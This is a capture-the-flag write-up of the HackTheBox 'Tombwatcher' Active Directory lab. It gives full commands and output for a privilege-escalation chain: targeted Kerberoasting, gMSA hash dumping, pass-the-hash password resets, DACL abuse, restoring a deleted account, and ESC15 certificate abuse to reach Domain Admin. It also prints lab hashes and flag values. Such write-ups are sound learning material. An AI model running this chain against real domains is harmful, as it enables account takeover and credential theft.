# HTB Tombwatcher — Writeup

**Target:** 10.129.25.198 (DC01.tombwatcher.htb)
**Domain:** tombwatcher.htb
**Difficulty:** Windows Active Directory box
**Starting point:** Credentials provided in the machine description — `henry / H3nry_987TGV!`
**Author:** Faridd
---

## 1. Reconnaissance

### 1.1 — Port Scanning

A fast port scan was run first with RustScan to identify open ports:

```bash
rustscan -a 10.129.25.198
```

Open ports:

```
53   - DNS
80   - HTTP
88   - Kerberos
135  - RPC
139  - NetBIOS
389  - LDAP
445  - SMB
464  - kpasswd (Kerberos password change)
593  - RPC over HTTP
636  - LDAPS
3268 - Global Catalog (LDAP)
3269 - Global Catalog (LDAPS)
5985 - WinRM
9389 - AD Web Services
```

This combination of ports (88, 389, 445, 464, 3268, 9389) is the standard fingerprint of a Windows **Active Directory Domain Controller**. There is no separate application server here — DC01 is both the domain controller and the only host in scope.

A follow-up detailed scan confirmed the domain name and DC hostname:

```bash
nmap -sC -sV -p80,88,389,445,464,593,3268 10.129.25.198
```

Key findings from this scan:
- `Microsoft IIS httpd 10.0` on port 80
- LDAP banner confirms domain: `tombwatcher.htb`, DC hostname: `DC01.tombwatcher.htb`
- SMB signing is **enabled and required** (this rules out SMB relay attacks against this host)
- A large clock skew (~4 hours) was reported between the scanner and the target. This is important to remember, because Kerberos authentication is time-sensitive and clock drift causes authentication failures later on.

### 1.2 — Initial Credentials

The machine description provided a starting set of credentials:

```
henry / H3nry_987TGV!
```

This is common on "assumed breach" style AD boxes — the exercise does not start from zero, it starts from an already-compromised low-privilege domain user.

---

## 2. Domain User Enumeration

### 2.1 — Listing Domain Users via SMB

Using Henry's credentials, the full list of domain users was pulled over SMB:

```bash
netexec smb 10.129.25.198 -u 'henry' -p 'H3nry_987TGV!' --users
```

Result — 7 domain users:

```
Administrator
Guest
krbtgt
Henry
Alfred
sam
john
```

This user list was saved locally for later use (e.g. targeted Kerberoasting, password spraying, BloodHound cross-referencing):

```bash
cat users | awk '{print $5}' > usernames.txt
```

### 2.2 — BloodHound Collection

BloodHound data was collected as Henry to map out AD relationships (group memberships, ACLs, sessions, etc.):

```bash
bloodhound-python -ns 10.129.25.198 -d tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' -c All --zip
```

The resulting zip was imported into the BloodHound GUI. Graph analysis revealed a complete privilege escalation chain from Henry all the way to Domain Admin:

```
Henry --(WriteSPN)--> Alfred
Alfred --(AddSelf)--> Infrastructure (group)
Infrastructure --(ReadGMSAPassword)--> ANSIBLE_DEV$
ANSIBLE_DEV$ --(ForceChangePassword)--> sam
sam --(WriteOwner)--> john
john --(GenericAll)--> ADCS (container)
ADCS container --(contains)--> cert_admin (deleted/restorable object with template enrollment rights)
--> ESC15 abuse --> Administrator certificate --> Domain Admin
```

This single graph is effectively the whole roadmap for the box. Every section below is one link in this chain, executed manually.

---

## 3. Henry → Alfred (Targeted Kerberoasting via WriteSPN)

### 3.1 — What BloodHound Showed

BloodHound showed a `WriteSPN` edge from **Henry** to **Alfred**. This means Henry has the right to write to the `servicePrincipalName` attribute of Alfred's user object.

Normally, Kerberoasting only works against accounts that already have an SPN set (i.e., service accounts), because only accounts with an SPN can have a Kerberos service ticket (TGS) requested for them. Alfred is a regular user with no SPN, so he isn't kerberoastable by default. However, because Henry can **write** an SPN onto Alfred's account, Henry can artificially make Alfred kerberoastable — this is called **Targeted Kerberoasting**.

### 3.2 — Fixing Kerberos Clock Skew

Before any Kerberos-based attack (Kerberoasting, TGT requests, PKINIT, etc.) can succeed, the attacking machine's clock must be reasonably in sync with the DC's clock, because Kerberos rejects tickets with too much time skew. Since nmap had already reported a large clock skew, this was corrected first:

```bash
sudo timedatectl set-ntp false
sudo ntpdate 10.129.25.198
```

### 3.3 — Running the Targeted Kerberoast Attack

The `targetedKerberoast.py` script automates the whole process: it enumerates every user in the domain, checks which ones the current user (Henry) has write permission over (GenericWrite/GenericAll/WriteSPN), adds a temporary fake SPN to each qualifying account, requests a TGS for it, prints the crackable hash, and then removes the SPN again — without the operator needing to specify a target manually.

```bash
python3 targetedKerberoast.py -u henry -p 'H3nry_987TGV!' --dc-ip 10.129.25.198 -d tombwatcher.htb
```

The script automatically found Alfred (via the WriteSPN edge) and returned a Kerberoastable TGS hash for the `Alfred` account, in `$krb5tgs$23$...` format (RC4-encrypted service ticket).

### 3.4 — Cracking the Hash

The hash was cracked offline with hashcat, mode `13100` (Kerberoast / TGS-REP):

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

Result:

```
Alfred : basketball
```

---

## 4. Alfred → Infrastructure Group → ANSIBLE_DEV$ (gMSA Abuse)

### 4.1 — Adding Alfred to the Infrastructure Group

BloodHound showed an `AddSelf` edge from Alfred to the **Infrastructure** group. This means Alfred has the right to add himself as a member of that group (this is a specific AD permission, separate from actually being a member).

```bash
bloodyAD -u alfred -p 'basketball' --host 10.129.25.198 -d tombwatcher.htb add groupMember "INFRASTRUCTURE" "Alfred"
```

Result: `Alfred added to INFRASTRUCTURE`.

### 4.2 — Why Infrastructure Group Membership Matters

BloodHound showed that the Infrastructure group has a `ReadGMSAPassword` edge to a **gMSA (group Managed Service Account)** called `ANSIBLE_DEV$`. gMSAs are special service accounts whose passwords are managed and rotated automatically by AD. Normally nobody can read a gMSA's password directly — but AD allows specific principals (users, groups, or computers) to be explicitly authorized to read a gMSA's password blob. Being a member of the Infrastructure group grants exactly that authorization here.

Since Alfred is now a member of Infrastructure, he can read the password material of `ANSIBLE_DEV$`.

### 4.3 — Dumping the gMSA Password

`gMSADumper.py` was used, authenticating as Alfred, to pull the gMSA's password material:

```bash
python3 gMSADumper.py -u alfred -p 'basketball' -d tombwatcher.htb
```

Output:

```
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::b91f529d36292ba764273e5dd7b90fa1
ansible_dev$:aes256-cts-hmac-sha1-96:3eafb50e4a2d0982e7f8ac906387f812703bab1a23d300d5cb450639bb359f7b
ansible_dev$:aes128-cts-hmac-sha1-96:e1ac8d898573d5b37b6e054153be603d
```

The NTLM hash `b91f529d36292ba764273e5dd7b90fa1` for `ansible_dev$` is the key result here. It allows Pass-the-Hash authentication as that gMSA account.

---

## 5. ANSIBLE_DEV$ → sam (Forced Password Reset)

### 5.1 — Why ANSIBLE_DEV$ Was Targeted

BloodHound showed a `ForceChangePassword` edge from `ANSIBLE_DEV$` to the user **sam**. This means the gMSA has the right to reset sam's password directly, without knowing sam's current password.

### 5.2 — Resetting sam's Password with Pass-the-Hash

The `pth-toolkit` version of `net rpc password` was used to reset sam's password using the gMSA's NTLM hash (Pass-the-Hash — no plaintext password needed):

```bash
pth-net rpc password "sam" "newP@ssword2022" \
  -U "tombwatcher.htb"/"ANSIBLE_DEV$"%"ffffffffffffffffffffffffffffffff":"b91f529d36292ba764273e5dd7b90fa1" \
  -S "dc01.tombwatcher.htb"
```

Note: the LM hash portion is padded with `f`'s (`ffff...`) because only the NT hash is known/needed; this is standard Pass-the-Hash syntax.

### 5.3 — Verifying Access as sam

```bash
netexec smb 10.129.25.198 -u 'sam' -p 'newP@ssword2022'
```

Result: `[+] tombwatcher.htb\sam:newP@ssword2022` — authentication confirmed. Sam's password is now known in plaintext (`newP@ssword2022`) going forward.

---

## 6. sam → john (WriteOwner Abuse)

### 6.1 — What BloodHound Showed

BloodHound showed a `WriteOwner` edge from **sam** to **john**. In Active Directory, the **owner** of an object is always allowed to modify that object's DACL (its permission list), regardless of what permissions are explicitly granted in the DACL itself. This makes `WriteOwner` a powerful primitive: if you can become the owner of an object, you can then grant yourself any permission you want over it.

### 6.2 — Step 1: Take Ownership of John's Object

```bash
bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u sam -p 'newP@ssword2022' set owner john sam
```

Result: `[+] Old owner S-1-5-21-...-512 is now replaced by sam on john` (the old owner SID `-512` corresponds to Domain Admins).

### 6.3 — Step 2: Grant Full Control Over John

Now that sam owns John's object, sam can rewrite John's DACL to grant himself full rights:

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' \
  'tombwatcher.htb'/'sam':'newP@ssword2022' -dc-ip 10.129.25.198
```

Result: `[*] DACL modified successfully!`

### 6.4 — Step 3: Reset John's Password

With FullControl over John's object, sam can force-reset John's password without needing his old password:

```bash
net rpc password "john" "newP@ssword2022" \
  -U "tombwatcher.htb"/"sam"%"newP@ssword2022" \
  -S "dc01.tombwatcher.htb"
```

### 6.5 — Verifying Access as John

```bash
netexec smb 10.129.25.198 -u 'john' -p 'newP@ssword2022'
```

Result: `[+] tombwatcher.htb\john:newP@ssword2022` — confirmed.

### 6.6 — Shell Access and Flag

```bash
evil-winrm -i 10.129.25.198 -u john -p 'newP@ssword2022'
```

Inside the shell:

```powershell
cd ..\Desktop
type user.txt
```

Result: `dc5961fb0ea53aa3a5d6d62ed0569cd6` (user flag).

`whoami /priv` showed no interesting standalone privileges (SeMachineAccountPrivilege, SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege only) — this account does not have an obvious local privilege escalation path on its own. The actual escalation path continues through AD Certificate Services, per the BloodHound graph.

---

## 7. john → ADCS (GenericAll) → ESC15 → Domain Admin

This is the final stage of the chain and by far the most involved. BloodHound showed that **john has a GenericAll permission over the ADCS container** (the "Public Key Services" container in AD, where certificate templates and CA configuration objects live). `GenericAll` on a container effectively means full control over that container and, through inheritance, over the objects inside it.

### 7.1 — Enumerating AD Certificate Services with Certipy

Because john has control over the ADCS container, the entire certificate infrastructure of the domain was enumerated as john using Certipy:

```bash
certipy-ad find -u john -p 'newP@ssword2022' -target dc01.tombwatcher.htb -dc-ip 10.129.25.198
```

This command authenticates as john and pulls, over LDAP, the full configuration of every certificate template, the Certificate Authority (`tombwatcher-CA-1`), issuance policies, and their associated permissions. The results are written to a `.txt` and a `.json` file.

**Important note on command choice:** initially `-vulnerable` was used, which is a filter flag — it only shows templates where the *current* authenticated user (john, in this case) has an actual, usable enrollment right based on john's own SIDs. This flag hid the interesting finding entirely, because the enrollment right in question belonged to a SID that did **not** match any of John's own group memberships. Switching to the unfiltered `find` command (no `-vulnerable`) was what surfaced it.

### 7.2 — Why Enrollment Rights Are Checked

For every certificate template, the **Enrollment Rights** section lists which users/groups are allowed to request a certificate ("enroll") from that template. This is checked as a standard step in every ADCS review, because:

- Templates should normally only be enrollable by admin-level groups (Domain Admins, Enterprise Admins, or specific service accounts). If a broad or unexpected principal has enrollment rights, combined with a weak template configuration, it can lead to certificate-based privilege escalation (the "ESC" family of attacks).
- Any principal listed here that cannot be resolved to a readable name (i.e., it's shown only as a raw SID string) is a red flag — it usually indicates a deleted account whose SID is still referenced in an Access Control Entry (ACE) that was never cleaned up.

Reading the `.txt` output, the **WebServer** certificate template's Enrollment Rights section showed:

```
Enrollment Rights : TOMBWATCHER.HTB\Domain Admins
                     TOMBWATCHER.HTB\Enterprise Admins
                     S-1-5-21-1392491010-1358638721-2126982587-1111
```

The first two entries are expected/normal. The third entry — a raw, unresolved SID — was the anomaly. Certipy itself also flagged this during enumeration:

```
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
```

### 7.3 — Confirming the SID Belongs to a Deleted Object

SIDs in Windows are never reused and are never assigned without an underlying object having existed at some point. If a SID cannot be resolved to a name, the most likely explanation is that the object was deleted, but its ACE (referencing its SID) survived on another object (in this case, on the WebServer template's ACL) because deleting an account does not automatically clean up every ACE across the domain that references its SID.

A normal (non-deleted) lookup returned nothing:

```powershell
Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"'
```

Including deleted objects in the search confirmed the object exists in the Active Directory Recycle Bin:

```powershell
Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -IncludeDeletedObjects -Properties *
```

Key fields from the output:

```
CN                  : cert_admin  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
Deleted             : True
isDeleted           : True
LastKnownParent     : OU=ADCS,DC=tombwatcher,DC=htb
ObjectGUID          : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid           : S-1-5-21-1392491010-1358638721-2126982587-1111
sAMAccountName      : cert_admin
```

This confirmed: the unresolved SID belongs to a deleted user called **cert_admin**, originally located inside the `OU=ADCS` organizational unit — the very container john has GenericAll over. Since Active Directory keeps deleted objects recoverable for a retention period (AD Recycle Bin), this account can be restored.

### 7.4 — Restoring cert_admin

From the Evil-WinRM session as john:

```powershell
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```

Verifying the restore:

```powershell
Get-ADObject -Filter 'objectSid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"'
```

This confirmed `cert_admin` was now an active object again, at `CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb`.

### 7.5 — Granting Explicit Full Control Over the ADCS OU

Because john's GenericAll over the ADCS container is a container-level ACE, and restored/protected objects can sometimes fail to fully inherit permissions from their parent OU (particularly if `adminCount=1` is set on the object, which blocks ACE inheritance), an explicit DACL write was performed directly against the ADCS OU to be certain john's control also applies going forward:

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance \
  -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' \
  TOMBWATCHER.HTB/john:'newP@ssword2022'
```

Result: `[*] DACL modified successfully!`

### 7.6 — Resetting cert_admin's Password

With full control confirmed over the ADCS OU (and therefore over `cert_admin`, which lives inside it), cert_admin's password was reset:

```bash
bloodyAD --host 'dc01.tombwatcher.htb' -d 'tombwatcher.htb' -u 'john' -p 'newP@ssword2022' set password cert_admin 'newP@ssword2022'
```

Result: `[+] Password changed successfully!`

cert_admin is now a usable, authenticated account with credentials `cert_admin : newP@ssword2022`, and — critically — it still retains its original enrollment right on the WebServer certificate template.

### 7.7 — ESC15: Abusing the WebServer Template

**What ESC15 is:** ESC15 is an AD CS privilege escalation technique that abuses **Schema Version 1** certificate templates where the flag **"Enrollee Supplies Subject"** is enabled. This flag means that whoever requests a certificate from the template is allowed to specify the certificate's Subject/UPN themselves, rather than the CA forcing it to match the requester's own identity. On Schema Version 1 templates specifically, the requester can also freely specify arbitrary **Application Policies / Extended Key Usages (EKUs)** on the request, which the CA does not restrict. This combination allows a low-privileged account with enrollment rights on such a template to obtain a certificate that impersonates any other user — including Domain Admins — by directly supplying their UPN as the subject and choosing an EKU that permits authentication.

**How ESC15 was determined to be present here:** The WebServer template's configuration (visible in the certipy output) showed:
- `Enrollee Supplies Subject : True`
- `Schema Version : 1`
- `Extended Key Usage : Server Authentication` (this is not client authentication by itself, but because it's a Schema Version 1 template with no restriction on requested Application Policies, an attacker can add extra Application Policies to a request — specifically the "Certificate Request Agent" policy — which is not something the template restricts)

This combination (Schema Version 1 + Enrollee Supplies Subject + no CA-side Subject Alternative Name restriction) is exactly the precondition documented for ESC15.

The abuse requires two separate certificate requests, because the WebServer template alone does not grant client authentication capability directly — instead it is abused to first obtain an **enrollment agent** certificate, which is then used to request a real, properly-scoped certificate on behalf of another user.

**Step 1 — Request a "Certificate Request Agent" certificate as cert_admin:**

```bash
certipy-ad req -u cert_admin -p 'newP@ssword2022' \
  -dc-ip 10.129.25.198 -target dc01.tombwatcher.htb \
  -ca tombwatcher-CA-1 -template WebServer \
  -upn administrator@tombwatcher.htb \
  -application-policies 'Certificate Request Agent'
```

This requests a certificate through the WebServer template, but supplies `administrator@tombwatcher.htb` as the UPN and adds the **"Certificate Request Agent"** Application Policy. This policy is a special Windows PKI Enrollment Agent role — normally used legitimately (e.g., for smart card enrollment on behalf of other users) — that grants its holder the ability to request certificates *on behalf of other users*. Because the WebServer template does not restrict which Application Policies can be requested, this was accepted.

Result:

```
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Saving certificate and private key to 'administrator.pfx'
```

At this point, `administrator.pfx` is **not yet** a usable Administrator identity certificate — it is an "enrollment agent" certificate, which grants the right to request further certificates for other users.

**Step 2 — Use the agent certificate to enroll on behalf of Administrator:**

```bash
certipy-ad req -u cert_admin -p 'newP@ssword2022' \
  -dc-ip 10.129.25.198 -target dc01.tombwatcher.htb \
  -ca tombwatcher-CA-1 -template User \
  -pfx administrator.pfx \
  -on-behalf-of 'tombwatcher\Administrator'
```

This uses the agent certificate from Step 1 (`-pfx administrator.pfx`) to request a certificate from the **User** template (a standard, properly-scoped template that supports client authentication), explicitly on behalf of the domain's built-in Administrator account (`-on-behalf-of`).

Result:

```
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
```

The SID suffix `-500` is always the well-known RID for the built-in **Administrator** account in any AD domain, confirming this certificate is genuinely bound to the domain's Administrator identity.

### 7.8 — Converting the Certificate into a Usable Credential

The certificate by itself is not a login session — it needs to be exchanged for a Kerberos ticket via PKINIT. Certipy handles this exchange and can also recover the NTLM hash from the resulting ticket:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.25.198
```

Result:

```
[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
```

This produced both a Kerberos TGT (`administrator.ccache`) and the raw NTLM hash for the built-in Administrator account — either is sufficient to authenticate as Administrator.

### 7.9 — Administrator Access and Root Flag

Using Pass-the-Hash with the recovered NTLM hash:

```bash
evil-winrm -i tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc
```

Inside the shell:

```powershell
cd ..\Desktop
type root.txt
```

Result: `259aa280631e999170a10c9362712ea0` (root flag).

---
